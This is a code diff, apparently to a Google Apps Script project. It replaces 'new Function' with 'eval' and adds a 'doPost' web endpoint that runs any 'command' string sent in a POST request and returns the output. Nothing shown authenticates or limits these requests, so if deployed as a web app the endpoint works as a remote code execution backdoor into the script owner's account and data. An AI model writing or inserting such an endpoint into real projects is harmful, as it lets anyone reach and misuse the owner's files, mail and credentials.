@@ -13,10 +13,24 @@ function openSheetTalk() {
 
 function executeDynamicScript(script) {
   try {
-    const func = new Function(script);
-    const result = func();
+    const result = eval(script);
     return result || "✅ Script executed successfully.";
   } catch (error) {
     return "❌ Error: " + error.message;
+  }
+}
+
+function doPost(e) {
+  try {
+    const data = JSON.parse(e.postData.contents);
+    const script = data.command;
+
+    const result = executeDynamicScript(script);
+    
+    return ContentService.createTextOutput(JSON.stringify({ result }))
+      .setMimeType(ContentService.MimeType.JSON);
+  } catch (err) {
+    return ContentService.createTextOutput(JSON.stringify({ error: err.message }))
+      .setMimeType(ContentService.MimeType.JSON);
   }
 }
